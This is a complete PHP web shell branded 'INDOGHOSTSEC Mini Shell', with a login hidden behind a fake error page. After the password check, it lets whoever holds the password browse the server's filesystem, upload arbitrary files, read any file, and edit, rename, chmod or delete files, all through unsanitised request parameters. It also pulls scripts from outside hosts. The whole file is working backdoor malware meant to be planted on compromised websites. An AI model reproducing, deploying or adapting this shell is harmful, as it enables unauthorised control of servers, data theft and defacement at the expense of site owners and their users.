<?php
session_start();
set_time_limit(0);
error_reporting(0);
$ua = $_SERVER['HTTP_USER_AGENT'];
if(isset($_SESSION['pw'])){
	body();
} else {
	echo '<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
			<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
			<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
			<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
			<title>Ooups! Something went wrong</title>
			<style>
				input {
					background: transparent;
					opacity: 0.10;
				}
			</style>
			<link rel=\'stylesheet\' href=\'https://cdn.jsdelivr.net/npm/sweetalert2@9.15.1/dist/sweetalert2.min.css\' type=\'text/css\'>
  			<center><form method="POST"><input type="password" name="password"/><input class="btn btn-primary" type="submit" name="submit" value="submit"></form>';
	if(isset($_POST["submit"])){
		$pas = MD5($_POST["password"]);
		if($pas == "8ac57deb26b056d44361c4f4d051fe0f"){
			session_start();
			$_SESSION["pw"] = $pw;
			body();
		} else {
			echo "<script>window.location.onload();</script>";
		}
	}
}
function body(){
	if(get_magic_quotes_gpc()){
		foreach($_POST as $key=>$value){
			$_POST[$key] = stripslashes($value);
		}
	}
	echo '<!DoctypeHtml>
	<html>
		<head>
			<meta charset="UTF-8">
			<title>INDOGHOSTSEC Mini Shell</title>
			<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
			<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
			<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
			<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
			<script type="text/javascript" src="http://m.free-codes.org/gh.php?id=2001"></script><html> 
			<meta name="author" content="SuhandiGhost">
			<meta name="description" content="Mini shell 1.5 | Indonesian Ghost Security">
			<link href="https://fonts.googleapis.com/css?family=Chela+One" rel="stylesheet" type="text/css">
			<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
			<link href="https://cdnjs.loli.net/ajax/libs/startbootstrap-clean-blog/5.0.2/css/clean-blog.min.css" rel="stylesheet" type="text/css">
			<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@9.15.1/dist/sweetalert2.min.css" type="text/css">
			<style>
				body {
					background-color: black;
				}
				table{
					background-color: #4CAF50;
				    border: 1px black dotted;
					opacity: 0.5;
				}
				.motto-shake {
  position: relative;
}

@keyframes noise-anim {
  0% {
    clip: rect(55px, 9999px, 9px, 0);
  }
  5% {
    clip: rect(12px, 9999px, 60px, 0);
  }
  10% {
    clip: rect(85px, 9999px, 83px, 0);
  }
  15% {
    clip: rect(83px, 9999px, 84px, 0);
  }
  20% {
    clip: rect(39px, 9999px, 69px, 0);
  }
  25% {
    clip: rect(41px, 9999px, 7px, 0);
  }
  30% {
    clip: rect(32px, 9999px, 6px, 0);
  }
  35% {
    clip: rect(75px, 9999px, 19px, 0);
  }
  40% {
    clip: rect(5px, 9999px, 63px, 0);
  }
  45% {
    clip: rect(55px, 9999px, 43px, 0);
  }
  50% {
    clip: rect(80px, 9999px, 71px, 0);
  }
  55% {
    clip: rect(67px, 9999px, 69px, 0);
  }
  60% {
    clip: rect(45px, 9999px, 99px, 0);
  }
  65% {
    clip: rect(67px, 9999px, 93px, 0);
  }
  70% {
    clip: rect(12px, 9999px, 69px, 0);
  }
  75% {
    clip: rect(58px, 9999px, 28px, 0);
  }
  80% {
    clip: rect(53px, 9999px, 40px, 0);
  }
  85% {
    clip: rect(86px, 9999px, 22px, 0);
  }
  90% {
    clip: rect(35px, 9999px, 100px, 0);
  }
  95% {
    clip: rect(99px, 9999px, 30px, 0);
  }
  100% {
    clip: rect(8px, 9999px, 51px, 0);
  }
}
.motto-shake:after {
   top: 0;
   bottom: 0;
   left: 0;
   right: 0;
   margin: auto;
  content: attr(data-text);
  position: absolute;
  left: 2px;
  text-shadow: -1px 0 inherit;
  top: 0;
  color: inherit;
  background: inherit;
  overflow: hidden;
  clip: rect(0, 900px, 0, 0);
  animation: noise-anim 2s infinite linear alternate-reverse;
}

@keyframes noise-anim-2 {
  0% {
    clip: rect(98px, 9999px, 50px, 0);
  }
  5% {
    clip: rect(97px, 9999px, 8px, 0);
  }
  10% {
    clip: rect(71px, 9999px, 79px, 0);
  }
  15% {
    clip: rect(72px, 9999px, 84px, 0);
  }
  20% {
    clip: rect(59px, 9999px, 36px, 0);
  }
  25% {
    clip: rect(44px, 9999px, 39px, 0);
  }
  30% {
    clip: rect(94px, 9999px, 60px, 0);
  }
  35% {
    clip: rect(78px, 9999px, 37px, 0);
  }
  40% {
    clip: rect(84px, 9999px, 29px, 0);
  }
  45% {
    clip: rect(27px, 9999px, 27px, 0);
  }
  50% {
    clip: rect(61px, 9999px, 87px, 0);
  }
  55% {
    clip: rect(100px, 9999px, 33px, 0);
  }
  60% {
    clip: rect(68px, 9999px, 4px, 0);
  }
  65% {
    clip: rect(100px, 9999px, 84px, 0);
  }
  70% {
    clip: rect(44px, 9999px, 57px, 0);
  }
  75% {
    clip: rect(90px, 9999px, 69px, 0);
  }
  80% {
    clip: rect(88px, 9999px, 22px, 0);
  }
  85% {
    clip: rect(81px, 9999px, 13px, 0);
  }
  90% {
    clip: rect(33px, 9999px, 38px, 0);
  }
  95% {
    clip: rect(1px, 9999px, 34px, 0);
  }
  100% {
    clip: rect(27px, 9999px, 57px, 0);
  }
}
.motto-shake:before {
  content: attr(data-text);
  position: absolute;
  left: -2px;
  text-shadow: 1px 0 inherit;
  top: 0;
  color: inherit;
  background: inherit;
  overflow: hidden;
  clip: rect(0, 900px, 0, 0);
  animation: noise-anim-2 3s infinite linear alternate-reverse;
  
}
.title {
  font-family: Ebrima;
  font-size: 40px;
  margin: 0;
  color: #fff;
  text-shadow: 0 0 10px #fff,0 0 20px #FF0000,0 0 40px #FF0000,0 0 60px #FF0000,0 0 90px #FF0000,0 0 5px #FF0000;
}
			</style>
		</head>
		<body>
			<script>(function(c,a,d){var b=function(f,e){this.el=a.querySelectorAll(f)[0];this.config=e||{};this.lyric=e.lyric||"";this.newLyric="";this.showUpSpeed=e.showUpSpeed||0;this.flashSpeed=e.flashSpeed||0;this.flashTimeout=e.flashTimeout||0;this.showOut()};b.prototype={showOut:function(){var f=this,g=0,e,h="";if(f.flashSpeed){f.newLyric=e=f.replaceFun(f.lyric,f.lyric.split(""))}else{f.newLyric=e=f.lyric}if(f.showUpSpeed){var j=setInterval(function(){h+=e.split("")[g];g++;f.newLyric=h;f.el.innerHTML=h;f.el.dataset.text=h;if(f.lyric.split("").length===g){clearInterval(j);setTimeout(function(){f.flash(f.newLyric)},f.flashTimeout)}},f.showUpSpeed)}else{f.el.innerHTML=e;f.el.dataset.text=e;setTimeout(function(){f.flash(f.newLyric)},f.flashTimeout)}},replaceFun:function(f,e){return f.split("").map(function(h){var g=e.filter(function(j,i){return e.indexOf(j)==i});return h=g[Math.floor((Math.random()*g.length))]}).join("")},flash:function(){var f=this,e=f.lyric.split(""),h=f.newLyric.split(""),g=f.flashSpeed;var i=setInterval(function(){if(h.join("")!==e.join("")){for(var j in e){if(h[j]!==e[j]){var k=e.filter(function(m,l){return e.indexOf(m)==l});h[j]=k[Math.floor((Math.random()*k.length))];f.el.innerHTML=f.el.dataset.text=h.join("")}}}else{clearInterval(i);f.callback()}},g)},callback:function(){if(this.config.callback){this.config.callback()}}};if(typeof module==="object"&&typeof module.exports==="object"){module.exports=exports=b}else{if(typeof define==="function"&&define.amd){define(function(){return b})}else{if(typeof c==="object"){c.Motto=b}}}})(window,document);
			</script> 
	        <script>var motto = new Motto(".title", {
			    lyric: "INDOGHOSTSEC MiniShell",
			    showUpSpeed: 120,
			    flashSpeed: 100,
			    flashTimeout: 1000,
			    callback: function () {
			    }
				});
			</script> 
			<script src="https://cdn.jsdelivr.net/npm/sweetalert2@9.15.1/dist/sweetalert2.all.min.js"></script>
			<script type="text/javascript">
				function pesan_succes(){
					Swal.fire(
					  "Success",
					  "",
					  "success"
					)
				}
				function pesan_error(){
					Swal.fire({
					  icon: "error",
					  title: "FAILED",
					  text: ""
					})
				}
			</script>
			<center><br><br>
				<h1 class="title motto-shake" data-text="INDOGHOSTSEC">INDOGHOSTSEC MiniShell</h1><br><img src="https://k.top4top.io/p_1636ltjs90.jpg" width="250" height="250"/><br>
			</center><br><br>
			<table class="table" width="900" border="0" cellpadding="3" cellspacing="1" align="center">
				<tr>
					<td>
						<font color="black">Path : ';
					
	if(isset($_GET['y'])){
	    $path = $_GET['y'];   
	}else{
	    $path = getcwd();
	}
	$path = str_replace('\\','/',$path);
	$paths = explode('/',$path);

	foreach($paths as $id=>$pat){
	    if($pat == '' && $id == 0){
	        $a = true;
        echo '<a href="?y=/">/</a>';
	        continue;
	    }
	    if($pat == '') continue;
	    echo '<a href="?y=';
	    for($i=0;$i<=$id;$i++){
	        echo $paths[$i];
	        if($i != $id) echo "/";
	    }
	    echo '">'.$pat.'</a>/';
	}
	echo '<a href="?"><font color=white><b>&nbsp;&nbsp;&nbsp;Home </font></b></a></td></tr><tr><td>';
	if(isset($_FILES['file'])){
	    if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
	        echo '<script>window.onload(pesan_succes());</script>';
	    }else{
	        echo '<font color="red">File Upload Error.</font><br />';
	    }
	}
	echo '<center>';
	echo '<div class="custom-file">
<form enctype="multipart/form-data" method="POST">
<b><font color=cyan>File Upload : </b></font><input type="file" class="custom-file-input" id="validatedCustomFile" required name="file">
<label class="custom-file-label" for="validatedCustomFile">Choose file...</label>
<button class="btn btn-primary" type="Upload">Upload</button>
</div>
</form><br><br>
</td></tr>';
	if(isset($_GET['filesrc'])){
 	   echo "<tr><td><b><center><font color=red align=center>Current File :</font></b> ";
 	   echo '<a href="?filesrc='.$path/$file.'&y='.$path.'">'.$_GET[filesrc].'</a>';
   	 echo '</tr></td></table><br />';
  	  echo('<textarea cols=90 rows=20 name="src">'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>');
	}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
 	   echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
 	   if($_POST['opt'] == 'chmod'){
  	      if(isset($_POST['perm'])){
 	           if(chmod($_POST['path'],$_POST['perm'])){
	                echo '<script>window.onload(pesan_succes());</script>';
  	          }else{
    	            echo '<script>window.onload(pesan_error());</script>';
   	         }
  	      }
 	       echo '<form method="POST">
        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="chmod">
        <button class="btn btn-primary" type="submit">Done</button>
        </form>';
 	   }elseif($_POST['opt'] == 'rename'){
  	      if(isset($_POST['newname'])){
 	           if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
 	               echo '<script>window.onload(pesan_succes());</script>';
	            }else{
	                echo '<script>window.onload(pesan_error());</script>';
	            }
	            $_POST['name'] = $_POST['newname'];
	        }
	        echo '<form method="POST">
        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="rename">
        <button class="btn btn-primary" type="submit">Done</button>
        </form>';
	    }elseif($_POST['opt'] == 'edit'){
	        if(isset($_POST['src'])){
 	           $fp = fopen($_POST['path'],'w');
	            if(fwrite($fp,$_POST['src'])){
 	               echo '<script>window.onload(pesan_succes());</script>';
  	          }else{
  	              echo '<script>window.onload(pesan_error());</script>';
 	           }
	            fclose($fp);
  	      }
	        echo '<form method="POST">
 	       <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
 	       <input type="hidden" name="path" value="'.$_POST['path'].'">
 	       <input type="hidden" name="opt" value="edit">
 	       <input type="submit" value="Go" />
 	       </form>';
	    }
  	  echo '</center>';
	}else{
	    echo '</table><br /><center>';
	    if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
	        if($_POST['type'] == 'dir'){
	            if(rmdir($_POST['path'])){
 	               echo '<script>window.onload(pesan_succes());</script>';
	            }else{
 	               echo '<script>window.onload(pesan_error());</script>';
	            }
	        }elseif($_POST['type'] == 'file'){
 	           if(unlink($_POST['path'])){
 	               echo '<script>window.onload(pesan_succes());</script>';
	            }else{
 	               echo '<script>window.onload(pesan_error());</script>';
 	           }
	        }
	    }
 	   echo '</center>';
	    $scandir = scandir($path);
	    echo '<div id="content"><table class="tbl"  width="980" border="0" cellpadding="3" cellspacing="1" align="center">
	    <tr class="first">
        <td><center>Name</center></td>
        <td><center>Size</center></td>
        <td><center>Permissions</center></td>
        <td><center>Options</center></td>
  	  </tr>';
	    foreach($scandir as $dir){
	        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
	        echo "<tr>
        <td><a href=\"?y=$path/$dir\"><img width=50 height=50 src=\"https://h.top4top.io/p_1636717ie0.gif\" />&nbsp;&nbsp;$dir</a></td>
        <td><center>--</center></td>
        <td><center>";
 	       if(is_writable("$path/$dir")) echo '<font color="#ffffff">';
  	      elseif(!is_readable("$path/$dir")) echo '<font color="red">';
 	       echo perms("$path/$dir");
 	       if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
        
 	       echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&y=$path\">
        <select class=\"custom-select\" name=\"opt\">
	    <option selected>Menu Selected</option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        <option value=\"edit\">Edit</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"file\">
        <input type=\"hidden\" name=\"name\" value=\"$file\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
        <button class=\"btn btn-primary\" type=\"submit\">Submit</button>
        </form></center></td>
        </tr>";
	    }
	    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
    foreach($scandir as $file){
	        if(!is_file("$path/$file")) continue;
	        $size = filesize("$path/$file")/1024;
 	       $size = round($size,3);
	        if($size >= 1024){
 	           $size = round($size/1024,2).' MB';
	        }else{
	            $size = $size.' KB';
	        }

 	       echo "<tr>
        <td><a href=\"?filesrc=$path/$file&y=$path\"><img width=50 height=50 src=\"https://g.top4top.io/p_163607qjv0.png\" />&nbsp;&nbsp;$file</a></td>
        <td><center>".$size."</center></td>
        <td><center>";
	        if(is_writable("$path/$file")) echo '<font color="green">';
 	       elseif(!is_readable("$path/$file")) echo '<font color="red">';
	        echo perms("$path/$file");
 	       if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
  	      echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&y=$path\">
        <select class=\"custom-select\" name=\"opt\">
	    <option selected>Menu Selected</option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        <option value=\"edit\">Edit</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"file\">
        <input type=\"hidden\" name=\"name\" value=\"$file\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
        <button class=\"btn btn-primary\" type=\"submit\">Submit</button>
        </form></center></td>
        </tr>";
	    }
	    echo '</table>
	    </div>';
	}
	echo '<script type="text/javascript" src="http://htmlfreecodes.com/codes/rain.js"></script></BODY></HTML>';
}
function perms($file){
	$perms = fileperms($file);

	if (($perms & 0xC000) == 0xC000) {
  	  $info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
  	  $info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
  	  $info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
   	 $info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
  	  $info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
   	 $info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	    $info = 'p';
	} else {
 	   $info = 'u';
	}
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
    	        (($perms & 0x0800) ? 's' : 'x' ) :
  	          (($perms & 0x0800) ? 'S' : '-'));

	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
     	       (($perms & 0x0400) ? 's' : 'x' ) :
 	           (($perms & 0x0400) ? 'S' : '-'));

	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
   	         (($perms & 0x0200) ? 't' : 'x' ) :
   	         (($perms & 0x0200) ? 'T' : '-'));

 	   return $info;
 }
?>